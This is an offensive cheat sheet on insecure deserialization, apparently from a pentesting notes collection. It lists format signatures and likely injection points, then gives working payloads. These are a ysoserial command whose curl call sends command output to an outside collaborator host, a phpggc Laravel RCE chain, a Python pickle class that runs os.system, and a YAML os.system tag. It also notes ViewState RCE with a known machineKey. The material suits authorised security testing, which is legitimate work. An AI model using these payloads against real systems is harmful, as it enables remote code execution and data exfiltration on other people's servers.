# Insecure Deserialization

Serialized data that the server trusts. The payload is a gadget chain, not a string.

---

## Identify the format

| Format | Tell |
|---|---|
| Java | `rO0AB` base64, `AC ED 00 05` hex, `Content-Type: application/x-java-serialized-object` |
| PHP | `O:4:"User":2:{...}` |
| Python pickle | `\x80\x04`, base64 `gASV` |
| .NET | `AAEAAAD/////`, `__type` in JSON |
| Ruby Marshal | `\x04\x08` |
| YAML | `!ruby/object:`, `!!python/object` |

---

## Where

- Cookies (`session`, `state`, `remember`)
- Hidden form fields
- ViewState (`__VIEWSTATE`)
- API bodies with a `data` or `payload` blob
- Cache/queue messages
- `?state=` in OAuth/SAML

---

## Java

```bash
# detect
echo 'rO0AB...' | base64 -d | xxd | head
# exploit
java -jar ysoserial.jar CommonsCollections6 'curl http://collab/$(id)' > p.ser
```

Gadget chains: CommonsCollections 1-7, CommonsBeanutils, Groovy, Spring, Hibernate,
URLDNS (for detection only — no RCE).

`URLDNS` is the safe first probe: it only does a DNS lookup.

---

## PHP

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

POP chains via `__destruct`, `__wakeup`, `__toString`. Tools: `phpggc`.

```
phpggc Laravel/RCE1 system id
```

Also `phar://` deserialization when a file path is passed to a file function.

---

## Python pickle

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())))
```

---

## .NET

`ysoserial.net` with `-g TypeConfuseDelegate -f Json.Net`. ViewState with a known
`machineKey` → full RCE.

---

## YAML

```yaml
!!python/object/apply:os.system ["id"]
```

Ruby: `!ruby/object:Gem::Requirement`.

---

## Go deeper

1. Decode and re-encode a cookie unchanged — does the app accept it?
2. Send a modified field — does it error with a class name?
3. Try URLDNS first (safe), then a full chain.
4. Test `phar://` on every file-path parameter.
5. Check whether the deserializer is behind an auth boundary — often it is not.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
